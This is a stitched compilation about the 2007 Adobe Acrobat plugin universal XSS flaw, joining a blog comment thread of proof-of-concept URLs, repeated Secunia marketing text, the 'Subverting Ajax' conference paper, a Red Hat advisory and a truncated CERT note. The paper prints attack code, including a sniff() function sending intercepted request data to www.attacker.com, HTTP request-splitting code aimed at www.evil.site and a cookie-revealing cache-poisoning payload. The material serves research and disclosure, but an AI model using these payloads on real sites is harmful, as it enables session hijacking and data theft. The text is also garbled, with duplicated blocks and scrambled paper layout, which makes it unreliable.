If the action is "Open with default app" or "save to disk", the exploit does not work.![h4ck](//gravatar.com/avatar/68d44e094e3890d433e09f1d100cf896?s=256&d=retro)h4ck[http://www.google.com/librariancenter/downloads/Tips\_Tricks\_85x11.pdf#something=javascript:alert('xss');](https://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:alert('xss');)
This did not work for me.I have acrobat reader 7.0 installed on my machine.it did not give an alert message on my browser.![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdph4ck, this is because google fixed it by adding the following header to the response:
```
Content-disposition: attachement filename=filename_of_the_document.pdf
```
![KeithF](//gravatar.com/avatar/69de85828d22f4dc02e92571b0d2ad67?s=256&d=retro)KeithFI'm making a bit of an assumption here, but providing you type a direct URL into your address bar then, if the site itself hasn't been compromised, there is no chance of this vulnerability being exploited on a link created by the site owner.
It only becomes a problem with user generated content, or in the case of a phishing attack.
Am I right?
Keith![GE](//gravatar.com/avatar/206390c2dc812f35ca8aaa11ffecc840?s=256&d=retro)GEThe example did work for me. I am more interested in the "Content-disposition: attachement filename=filename\_of\_the\_document.pdf".. is this a resolution for this issue?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpKeithF, kind of... not completely. Yes, in certain situation the user has to click on a link. However, it is also possible for the attacker to launch an exploit automatically. Still a logged in user is required in order to gain the maximum benefit of the operation. The concept is exactly as the one found in XSS attack vectors.
GE, yes
this is what Google did to prevent their PDF files from being abused.![rootbeet](//gravatar.com/avatar/4b51888dca3d68e98e3d6eb8f8e309ef?s=256&d=retro)rootbeet[file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#a=javascript:alert('Hi');](file:///C%3A/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#a=javascript:alert('Hi');)
Doesn't work for me in IE. Doc just opens. Also, are u limited to 32 characters for the parameter + value?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpit works on very specific IE versions.

There are no limitations.![joeconodo](//gravatar.com/avatar/9533648af152d76d35e86f4116da3a07?s=256&d=retro)joeconodoin mac os x 10.4.8 ppc with safari 2.x or firefox 2.x doesn't work, mainly I Think because the acrobat 7.0.8 is called as an external application and not as a plugin![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpyou could be right![Klir](//gravatar.com/avatar/e1efeeab4f7f766d4c357a527155f8d9?s=256&d=retro)KlirItâ€™s not occurs on IE 7, IE6 SP2 FF 2.0.2 , 1.5.0.9 on windows XP ...
If a user still didnâ€™t understand that he needs to upgrade to the latest patch than maybe he deserve to be hackedâ€¦![Joel](//gravatar.com/avatar/476e02898e081f67375fc8f9771ca33a?s=256&d=retro)JoelFrom what I found (http://secunia.com/advisories/23483/) they claim that this can affect both IE and FF depends on the specific version of browser and acrobat.
Although the alert did not work for me on FF (up to date 2.0.0.1) this did work.
file:///C:/Program%20Files/Adobe/Acrobat%206.0/Help/ENU/Pdfmark.pdf#a=javascript:window.location.href='http://www.google.com';
So my guess is the bug exists just because the plugin takes the window over, we don't get to see that window, however the bug does exist, and can be used.

That appears to mitigate the threat.![MustLive](//gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=256&d=retro)MustLive
> Disable JavaScript or update to Acrobat 8.

Or disable Acrobat plugin, or even delete it. For your main browser or for all browsers in the system. There are many suggestions.
Guys, as Google tell me, the are up to 317 000 000 sites in the Internet which have pdf files (and they all have this vulnerability). So every admin of every site and every user need to deal with this Universal PDF XSS.![fearphage](//gravatar.com/avatar/cf9d4ff7e3dec9f1f108feb62153e36f?s=256&d=retro)fearphageThis is already patched in Opera![marvin](//gravatar.com/avatar/a86db371d8efe4163c177d067f73f539?s=256&d=retro)marvini tried that link, and it doesn't alert me with xss, but it prompts me to download that pdf file. Im using firefox 1.5.0.9 under ubuntu dapper![matt](//gravatar.com/avatar/30d413ad240f752aa3c79385b32c7a1a?s=256&d=retro)mattNice Work.![Sebastian Wolfgarten](//gravatar.com/avatar/ac559c279b10c2e14c0e30bef831761d?s=256&d=retro)Sebastian WolfgartenHi,
well one way to prevent people from exploiting your customers is to add the following directive to Apache's httpd.conf:
Header unset Content-Disposition
Header add Content-Disposition "attachment; filename=document.pdf"
This will cause a save/open dialogue to pop up every time a user tries to download a .pdf file. As the "normal" Acrobat is not vulnerable (it's just the plugin), potentially attached malicious code will not be executed. If one wants to keep the original name of the .pdf file untouched, then one could use Apache's environment variables rather than setting it to "filename=document.pdf".
Bye,
Sebastian![Sebastian Wolfgarten](//gravatar.com/avatar/ac559c279b10c2e14c0e30bef831761d?s=256&d=retro)Sebastian WolfgartenOkay, some stuff was stripped out from my previous posting...you basically need to wrap a FilesMatch-directive around the aforementioned "Header" settings...
Hope that helps!
Bye,
Seb![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpthanks Sebastian, that was very helpful![erez](//gravatar.com/avatar/a5066de475de171e84bea6cbed2caf2f?s=256&d=retro)erezseems to be fixed with the latest 7.0.9 patch...![alex](//gravatar.com/avatar/62c5b459b45a5467497b3b3148a9d0ee?s=256&d=retro)alexhi nice site.![Edward](//gravatar.com/avatar/a071ac65aed1002d91775b1fbee4ecba?s=256&d=retro)EdwardWe allow users to try our software by uploading documents to an application we host. Some of the uploaded documents can be seen and accessed by other users.
What kind of measures can we take so that users with older Acrobat versions are not compromised?![DReTeN](//gravatar.com/avatar/f789ee92569456849ce6cdd29497ed5e?s=256&d=retro)DReTeNyou just gotta convince them to get the newest version of Acrobat. That's why there are updates and improved versions, to fix the bugs and vulnerabilities of previous editions.![????????](//gravatar.com/avatar/3712eb8e31fe07fd895d582c28be7261?s=256&d=retro)????????KeithF, kind of… not completely. Yes, in certain situation the user has to click on a link. However, it is also possible for the attacker to launch an exploit automatically. Still a logged in user is required in order to gain the maximum benefit of the operation. The concept is exactly as the one found in XSS attack vectors.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Subverting Ajax

Stefano Di Paola  wisec@wisec.it,  Giorgio Fedon  giorgio.fedon@gmail.com

Abstract —     The   ability   of   modern   browsers   to   use

II. HOW AJAX WORKS

December 2006

asynchronous   requests   introduces   a   new   type   of   attack

vectors.   In   particular,   an   attacker   can   inject   client   side

code  to totally  subvert the  communication  flow  between

client   and   server.     In   fact,   advanced   features   of   Ajax

framework build up a new transparent layer not controlled

by the user. This paper will focus  on  security aspects of

Ajax   technology   and   on   their   influence   upon   privacy

issues.   Ajax   is   not   only   a   group   of   features   for   web

developers: it's a new paradigm that allows leveraging the

most refined client side attacks.

I. INTRODUCTION

Ajax[1]  is an  acronym  for  Asynchronous  Javascript
And XML. Ajax is not a new programming language,
is   an   umbrella   term   which   describes   a   group   of
features  and   enhancements  to   improve    appearance
and functionality of traditional web sites.
Ajax relies on XMLHttpRequest[2], CSS, DOM and
other technologies; the main characteristic of AJAX
is its “asynchronous” nature, which makes possible to
send and receive data from the server without having
to refresh the page. Common Ajax implementations
can be found in various languages and libraries like
ActiveX, Flash and Java applet.
This paper will focus on Javascript language, because
is   considered   the   formal  standard   in   Web   2.0
application development.
The   large   adoption   of   Javascript   in   Html   code
permits   to   create   a   transparent   data   exchange
between client  and  server. Users  then interact  with
standard   Html   objects   controlled   by   classes   and
procedures interpreted by their browsers.
Some examples of web applications that already use
Ajax are GMail, GoogleMaps or Live.com.

Subverting Ajax – S.Di Paola, G.Fedon

To   completely   understand   the   functioning   of   web
applications   integrated   with   Ajax,   we   can   look   at
figure   1   to   see   the   classic   web   application   model,
compared to the asynchronous one.
As   we   can   see,   asynchronous   requests   through
XMLHttpRequest   in   Ajax   model   are   totally
transparent to the end user.
Ajax   model   let   the   application   send   Http   requests
and   information   without   displaying   any   visual
acknowledgment, even on the browser's status bar.

Figure 1: Classic and Asynchronous models compared

In   Ajax   applications,   as   soon   as   the   browser   has
loaded the libraries of the application, users will not
experience   common   waitings   in   page   loading.   Ajax
framework and web server can refresh the content by
pushing  the data  to  the browser User Interface via
DOM[3] manipulation (Document Object Module).

policy to the  same origin. This kind of control will
deny   any   request   made   outside   actual   host,
considering port and protocol.
Other classes and implementations diversify security
policies to the context and scope of the object during
the use of different objects.

We   will   see   below   different   techniques   to   bypass
imposed restrictions.

III. AJAX KNOWN PROBLEMS

Applications   based   upon   Ajax   are   affected   by   the
same   problems   of   any   other   web   application,   but
usually   are   more   complex   because   of   their
asynchronous   nature.   During   development   it's
important   to   take   care   of   all   singular   aspects,
without focusing only on some functionalities and on
features related to business needs.
Superior   framework   complexity   can   lead   developers
to not refine the security aspects and to shorten the
testing process. In addition it's a common thought to
consider asynchronous requests non duplicable events
outside  the application.  It's  important to  point  out
that   such   requests   are   based   on   client-side   HTTP
protocol which is not reliable from a security point of
view (the sender can be impersonated if TLS is not
used).
Ajax problems are present both client side and server
side and can be classified as follows:

1. System Architecture;
2. Authorization and authentication;
3. Client/Server communication;
4. Management   of   communication   (usually

XML);

5. Client and Server are not trusted.

Analysis   of   previous   problems   can   be   found   in
publications of a number of researchers, in particular
Jeremiah Grossman[6], Billy Hoffman[7] and Andrew
Van der Stock[8]. It's suggested to read also OWASP
articles about Ajax Security[9]

In table 1 we can see a piece of javascript code where
XMLHttpRequest object is  used to  send some data
to a web server via the POST method.
As   soon   as   the   code   is   processed,   'xmlhttp'   object
will   set   any   information   about   the   data   being
exchanged, even a response that can be used by the
application, if needed.
It's   important   to   point   out   that   XMLHttpRequest
Object   is   not   the   only   available   tool   to   send
asynchronous  requests:  it's  possible  to   find  in  some
client-side  languages, browsers  and  plugins different
ways to deliver bidirectional requests.

var xmlhttp=null;
 try {
  xmlhttp = new
            ActiveXObject("Msxml2.XMLHTTP");
 } catch (e) {
   xmlhttp = false;
  }

 if(!xmlhttp && typeof

 XMLHttpRequest!='undefined') {

try {
        xmlhttp = new XMLHttpRequest();
} catch (e) {

xmlhttp=false;

}

  }
  xmlhttp.open("POST", "/",true);
  xmlhttp.setRequestHeader("Header", "Value");

  xmlhttp.onreadystatechange=function() {
  if (xmlhttp.readyState==4)
     if(xmlhttp.status==200)
      elaboraResponse(xmlhttp.responseText)

  }
  xmlhttp.send("data");
  xmlhttp.close();

Table 1: Javascript Code implementing an asynchronous
request via XMLHttpRequest Object

  In   Mozilla   Javascript   language,   for   example,
SoapCall[4] is available; in Internet Explorer can be
used XMLDocument[5] to request an XML document
via GET method.
Any one of the objects above, will include a security
model   to   control   requests   to   external   domains.   In
particular   XMLHttpRequest   applies   a   restriction

IV. ADVANCED ATTACKS

XSS Prototype Hijacking

It will now be described a new advanced technique to
gain   total   control   over   an   Ajax   application.   This
attack  is  exclusively  based on  some  of  the intrinsic
properties   of   Prototype   Languages[11]   like
Javascript.
Prototype   based   programming   is   a   style   of   Object
Oriented programming where classes are not present;
indeed,   objects   are   cloned   from   already   existing
objects   (native   objects)   or   from   scratch   (empty
objects).   Eventually,   new   methods   or   attributes
belonging   to   an   object   could   be   created   or
reimplemented by simply defining them.

To   better   understand   this   approach   let's   see   an
example.   Let's instantiate a new XMLHttpRequest
writing:

var xmlhttp= new XMLHttpRequest();

When the code is interpreted and executed, XmlHttp
object   will   not   be   a   new   instance   of
XMLHttpRequest   class,   but   will   be   simply   cloned
from the original XMLHttpRequest object.

From developer's perspective, this very intuitive and
extensible approach could allow to add new methods
and attributes directly to native objects.

For Example:

XMLHttpRequest.newMethod= function() {

 return "value";

}

From now on, the new method will be available to all
new cloned objects by simply calling it:

xmlhttp.newMethod();

Although   these   features   are   powerful,   this
extensibility    could  allow   anyone  to   overwrite  even
the   native   objects.   Let's   see   how   it's   possible   to
implement a new object which will wrap the native
XMLHttpRequest and that, once injected in a XSS

Subverting Ajax – S.Di Paola, G.Fedon

attack,   will   allow   the   attacker   to   intercept   any
callable method and any available attribute.
The   new   object   and   the   attack   will   be   totally
transparent to the application and most of all to the
end user. It's important to notice that this technique
can   be   applied   to   several   objects   and   to   Internet
Explorer  ActiveX as well.
This technique has been found by S. Di Paola and is
called Prototype Hijacking. It represents the state of
the   art   in   hijacking   techniques   applied   to   the
Javascript language.

Figure 2: Hijacking Technique applied to Ajax based
applications (Prototype Hijacking).

The most important concept could  be explained by
looking at the following code:

var xmlreqc=XMLHttpRequest;
XMLHttpRequest = function() {

this.xml = new xmlreqc();
return this;

}

In   this   example,  the   reference  to   XMLHttpRequest
native   object   is   saved   in   a   new   variable   and
XMLHttpRequest is readdressed to a new object by
using   one   of   the   many   ways   of   creating   a
constructor. Inside the constructor, a new attribute is
instantiated   as   the   previously   saved   real
XMLHttpRequest. From now on, every cloned object

23rd CCC Conference

4

will   be   a   wrapper   clone   and   not   a   clone   of   the
original one.
What   follows   is   the   implementation   of   wrapper
methods   for   some   of   XMLHttpRequest   native
objects,   in   order   to   create   a   Man   in   the   middle
attack  (ref. Figure 2).
Before   we   go   into   deep   of   hijacking,   let's   suppose
there   is   a   'sniff()'   function   using   the   techniques
described by Rager[13] and Grossman[6]:

function sniff(){
var data='';

   for(var i=0; i<arguments.length; i++)
     data+=arguments[i];
  if(image==null)
     image = document.createElement('img');
  if(data.length> 1024)
     data= data.substring(0, 1024) ;
    image.src=

'http://www.attacker.com/hijacked.html?data='+data;

 }

Let's   now   show   some   examples   that   wrap   native
methods and intercept them.

XMLHttpRequest.prototype.send = function (pay){

// Hijacked .send
sniff("Hijacked: "+" "+pay);
pay=HijackRequest(pay);
return this.xml.send(pay);

  }

By taking advantage of the previous wrapper it will
be possible to dynamically intercept all data, and it
will   even     be   possible   to   modify   it   by   using   any
function (HijackRequest in this case).

Next code example could allow an attacker to modify
any native attribute values or application behaviour,
by using defineSetter and defineGetter methods[14]:

  XMLHttpRequest.prototype.__defineSetter__(

"multipart",function (h){  //  Hijacked multipart

this.xml.multipart=h
sniff("multipart: "+" "+h);
return  h;

});

  XMLHttpRequest.prototype.__defineGetter__(

'status",function (){ // Hijacked status

h=this.xml.status ;
sniff("status: "+" "+h);

  return  h;

  });

Subverting Ajax – S.Di Paola, G.Fedon

Actually, by using this attack technique, a malicious
user could modify or inject requests and responses by
using some specifically crafted functions in a
transparent way to the user and to the underneath
application.

As   a   final   and   better   clarifying   example   of   the
consequences   of   this   attack,   let's   consider   an   Ajax
application   developed   for   bank   transfers.   This
application has a web dialog to confirm transactions
and notifies the user via SMS for every bank transfer
operation accomplished by an authenticated user.

If this Ajax interface is exposed to an XSS or to any
related vulnerability, attacker will just have to inject
the code and to wait for a  bank  transfer and then
use the same code to redirect requests and responses
to him.
In  this case, the attack is totally  independent from
any   authentication   system   used   such   as   One   Time
Passwords or RSA tokens. Ajax  based applications,
could   be   subverted   by   ignoring   the   application
specific implementations or communication modes. A
paradise for phishing attacks.

Universal XSS

to

find

inside

Browsers   are   applications   with   a   lot   of   different
features,   and   as   we   have   seen   previously   are
extremely   powerful.   Unfortunately,   when   software
complexity   increases,   will   increase   also   the
it   potential
probability
vulnerabilities[15].
Vulnerability   discovery   projects   like   “Browser
Fun”[16]   of   H.D.   Moore,   disclosed   during   time,
dozens   of   problems   inside   IE   advanced   features.
Indeed   most   of   them   were   linked   to   memory
handling,   memory   corruption   and   buffer   overflows,
some of the most interesting problems rely on higher
level implementations like the integration of built-in
client functionalities with browser's plug-ins.
UXSS (Universal Cross Site Scripting) is a particular
type of Cross Site Scripting and has the ability to be
triggered by exploiting flaws inside browsers, instead
of leveraging the vulnerabilities against insecure web
sites.

For   example   we   can   use   Mozilla   Firefox   (version
1.5.0.7)   and   insert   in   the   URL   field   the   following
code:

it's   possible   to   cause   a  DoubleFree() error   and   to
overwrite part of the Structural Exception Handler.

javascript:alert(“Test Alert”)

V. CACHE POISONING

Firefox   browsers   will   consider   the   previous   URL   a
javascript object and will execute alert(“Test Alert”)
code opening   a   pop-up.   This   event   is   not   strange
since it's a feature of the browser.
We   can   generate   some   more   interesting   things   by
supplying   different  kind   of   objects   to   plug-ins  that
expect  a   website   URL   to   be  passed   in   parameters.
For   example,   Adobe   Acrobat   plugin   for   Mozilla
Firefox   (acroreader)   is   able   to   populate   Portable
Documents   forms   by   supplying   an   external   set   of
data through the FDF, XML, or XFDF fields.
Implementation   of   FDF,   XML,   XFDF   requests   in
Acrobat   Reader   Plugin   is   vulnerable   to   different
types of attacks (S. di Paola, G. Fedon e E. Florio -
Ottobre 2006)[16]:

1. UXSS in #FDF, #XML e #XFDF;
2. Universal CSRF and session riding;
3. Possible Remote Code Execution;

Examples:

1.   By   using   the   following   request,   is   possible   to
execute javascript code inside the browser:

http://site.com/file.pdf#FDF=javascript:alert(“Test Alert”)

Among   all  advanced   web   attacks,  there  is  a   whole
category which is not very known but it worth to be
analyzed   into   deep;   this   is   HTTP   Request   and
Response   Splitting   by   Amit   Klein   and   others
researchers[17][18].   These   attack   vectors   are
constrained by a single factor: the presence of a web
proxy (reverse or forward).
This situation is easily found in corporate networks
(LAN)   or   in   wide   area   networks   (WAN).   HTTP
Request  and Response  Splitting are different in the
way   they   are   accomplished   and   in   the   way   they
allows to modify proxy and browser cache.
In this paper it will be described the HTTP Request
Splitting   attack   as   it   takes   advantage   of   a   base
implementation   of   asynchronous   requests   like
XMLHttpRequest.
The reader could refer to [17] and [18] to go deeper
into the theory of both attacks.

HTTP Request splitting

A   Request   Splitting   attack   abuses   flaws   in
asyncronous   requests   and   allows   to   inject  arbitrary
headers when an Http request is built. The attack in
the   following   examples   is   accomplished   using   IE's
ActiveX object 'Microsoft.XMLHTTP', but there are
unfixed objects in other browsers that permit it too.

The previous could be triggered against an site and
because of this is a UXSS.

Let's make an example:

2. In addition it's possibile to make the browser send
requests   to   any   URL   (Universal   CSRF)   in   the
following way:

var x = new ActiveXObject("Microsoft.XMLHTTP");
x.open("GET\thttp://www.evil.site/2.html\tHTTP/1.1\r\nHost:\t
www.evil.site\r\nProxy-Connection:\tKeep-
Alive\r\n\r\nGET","/3.html",false);
x.send();

http://site.com/file.pdf#FDF=http://host.com/index.html?param
=...

A javascript request forged as in the previous code
will send the following requests:

3.  There is  also   a   possible  Remote Code  Execution
(RCE)   by   leveraging   a   memory   corruption   in   the
following request:

GET http://www.evil.site/2.html HTTP/1.1
Host: www.evil.site
Proxy-Connection:Keep-Alive

http://site.com/file.pdf#FDF=javascript:document.write(“jjjjj...”);

GET /3.html  HTTP/1.1
Host: www.evil.site
Proxy-Connection:Keep-Alive

If there is a web proxy in the middle of the
communication, it will see two requests asking for
two pages at http://www.evil.com. As it explained in
figure 3, the proxy will send the two requests and
will get two response:

Next  step  is  to   open  a   new   window   via   Javascript
with   any   host   address   (e.g.   http://www.bank.com)
and the browser will queue Response 1_2  instead of
the original page.

Response 1: http://www.evil.site/2.html:
  <html> <body>   foo   </body>  </html>

Response 1_2: http://www.evil.site/3.html:
<html>   <head>  <meta http-equiv="Expires"
content="Wed, 01 Jan 2020 00:00:00 GMT">

  <meta http-equiv="Cache-Control" content="public">
  <meta http-equiv="Last-Modified" content="Fri, 01 Jan 2010
00:00:00 GMT">
  </head> <body>
  <script>

alert("DEFACEMENT and XSS: your cookie
is"+document.cookie)
 </script>

  </body>
  </html>

from browser's point of view, only request 1 has been
sent,   so   Response   1_2   is   simply   put   into   browser
queue waiting to be associated to the next request.

Figure 3: HTTP Request Splitting

Subverting Ajax – S.Di Paola, G.Fedon

Auto Injecting Cross Domain Scripting

It   will  be   presented   a   new   attack   technique   which
takes advantage of HTTP request-splitting or request
smuggling vulnerabilities and frame injection vectors.
As   a   result   of   this   attack   a   malicious   user   could
inject a particular snippet of javascript code into any
page   of   any   domain   to   take   control   over   user's
browsing sessions.
This new kind of attack has been called  AICS  and
has been thought by S. Di Paola and G. Fedon and
developed by S. Di Paola.

The Theory

In order to work there are some conditions to be met:

1. The user should have a forward proxy;
2. The user should have a browser or a plugin
vulnerable to request splitting/smuggling;
3. The   user   should   visit  a   malicious   site   or   a

site vulnerable to XSS (of any kind).

Often  happens  that  all  of   the conditions above  are
satisfied, in particular:

1.

2.

a   forward   proxy   is  often   used   in   corporate
LAN to give the users access to the internet;
there is  a   number  of  browsers and  browser
plugins   that   are   vulnerable   to   request
splitting/smuggling. A list could include:

•

•

•

•

IE 6.0 sp2 (HRS - not patched)
Flash   plugin   <7.x   and   <9.0.r16
(HRS)
Java VM version x.x (HR Smuggling)
etc.

3. A   user  could  be  forced  to   visit  a   malicious
site   by   taking   advantage   of   classic   social
engineering techniques or by abusing of one
of the attack vectors showed above.

Once   HRS   finds   its   environment,   an   attacker   can
inject fake html and javascript code in place of the
original   one.   When   HRS   was   discovered   by   Amit

23rd CCC Conference

7

Klein   it   was   thought   as   a   local   web   defacement
method in  a   cross domain  context.  This  is  a  really
dangerous scenario, but not the most dangerous one.
It should be noted, in fact, that a code injection into
every   page   and   into   every   domain   through   XSS
attack   types   like   the   ones   described   herein
(Prototype   Hijacking)   or   the   ones   documented   by
Jeremiah Grossman and Anton Rager, could turn a
single XSS into an auto injecting script.
Grossman's   technique   relies   on   scripts   containing
Iframe tags in order to take advantage of the “same
origin” policy applied to a single website (fig. 4).
This means that an attacker could get total control
over a website (which has a XSS vulnerability in it)
by simply controlling an inner frame.
If   a   browser   is   vulnerable   to   HRS   this   technique
could   be   applied   in   a   cross   domain   context   every
time   a   user   opens   a   new   page   or   exits   from   the
browser,   by   injecting   a   new   HRS.   So   even   if   a
website   in   not     vulnerable   to   XSS,   it   could   be
controlled.
In this scenario a user should visits an infected page
on a website (Fig. 5).  As soon as the script executes
the   malicious   request   splitting   and   redirects   the

Figure 4: A scheme of Grossmann's frame injection
technique

browser   to   the   homepage,   it   will   copy   itself   into
browser   local   cache   in   order   to   set   a   future
entrypoint.  Next time the user opens up an instance
of his preferred browser, the malicious script will be
ready   to   inject   itself   into   visited   pages   and   it   will
stay resident until browser cache would not be erased
manually.  In  order  to   accomplish  this  a   number  of
techniques are described by A. Klein in [21].

Subverting Ajax – S.Di Paola, G.Fedon

Figure 5: A scheme of Cross Domain Frame
Injection XDI

So far, as frame injection takes place, the user will
get   a   faked   homepage   but   the   right   address   in
browser's location bar.
At this point, the script listen for any event which
could  be  considered   a   domain  change   during   user's
navigation, such as:

1.

2.

3.

4.

onAbort   - Triggered when user presses stop
while a page is loading;
onBlur      -   Triggered   when   a   frame   or   a
window is not focused;
onUnload  -   Triggered   when   a   frame   or   a
document loads another url;
onClick   - Triggered when the user clicks on
a link.

In this way when the victim will ask for a new page
or for a new url, the script will be called by the event
trigger and it will perform a new HRS.
Differently   from   the   first   injection,   this   time   the
script  won't  redirect  the user  to  the  homepage  but
merely will wait for the user to ask for the page he is
going to load.
This   script   behaviour   will   assure   the   total   control
during  user's navigation and the attacker will have
the power to sniff and modify every packet passed to
the browser.

VI. CONCLUSIONS

We have seen that Ajax allows a new way to interact
with web applications. As usual, as new features are

23rd CCC Conference

8

implemented   new   attack   scenarios   open   to   the
horizon.
By using a new technique called Prototype Hijacking
it   has   been   shown   how   it   is   possible   to   sniff   and
manipulate   in   real   time   asynchronous   requests
originating   from   any   browser   in   a   way   which   is
transparent   and   independent   from   the   framework
used.
A   new   attack   vector   was   presented   as   UXSS   /
UCSRF which takes advantage of high level flaws in
browser integration with plug-ins.
It   follows   that   a   very   interesting   cache-injection
technique   permits   to   leverage   attacks   against   the
way   asynchronous   requests   are   made,   allowing   an
attacker to poison almost permanently the web sites
visited and stored into browser cache.
A new type of attack has been presented ('AICS') to
bypass   even   restrictions   imposed   by   web   sites   not
vulnerable   to   XSS.   It   should   be   noticed   that   an
attacker could take control over user navigation on
important websites by abusing a simple and detached
XSS vulnerability.
As it seems, Web 2.0 applications will be more and
more   tightly   tied   to   browser   security,   that   is
increasing   in  complexity   and   has   to   take  care  of   a
plethora of features that can be turned into weapons
if controlled by a malicious attacker.

# RHSA-2007:0017 - Security Advisory

* [Overview](#overview)

## Synopsis

Critical: Adobe Acrobat Reader security update

## Type/Severity

Security Advisory: Critical

## Topic

Updated acroread packages that fix several security issues are now
available for Red Hat Enterprise Linux 4.

This update has been rated as having critical security impact by the Red
Hat Security Response Team.

## Description

The Adobe Acrobat Reader allows users to view and print documents in
portable document format (PDF).

A cross site scripting flaw was found in the way the Adobe Reader Plugin
processes certain malformed URLs. A malicious web page could inject
arbitrary javascript into the browser session which could possibly lead to
a cross site scripting attack. (CVE-2007-0045)

Two arbitrary code execution flaws were found in the way Adobe Reader
processes malformed document files. It may be possible to execute arbitrary
code on a victim's machine if the victim opens a malicious PDF file.
(CVE-2006-5857, CVE-2007-0046)

All users of Acrobat Reader are advised to upgrade to these updated
packages, which contain Acrobat Reader version 7.0.9 and are not vulnerable
to these issues.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

To update all RPMs for your particular architecture, run:

rpm -Fvh [filenames]

where [filenames] is a list of the RPMs you wish to upgrade. Only those
RPMs which are currently installed will be updated. Those RPMs which are
not installed but included in the list will not be updated. Note that you
can also use wildcards (\*.rpm) if your current directory \*only\* contains the
desired RPMs.

Please note that this update is also available via Red Hat Network. Many
people find this an easier way to apply updates. To use Red Hat Network,
launch the Red Hat Update Agent with the following command:

up2date

This will start an interactive process that will result in the appropriate
RPMs being upgraded on your system.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Adobe Acrobat Plug-In cross domain violation

#### Vulnerability Note VU#815960

Original Release Date: 2007-01-03 | Last Revised: 2008-04-30

---

### Overview

The Adobe Acrobat Plug-In fails to properly validate user-supplied content, which may allow for cross-site scripting.

### Description

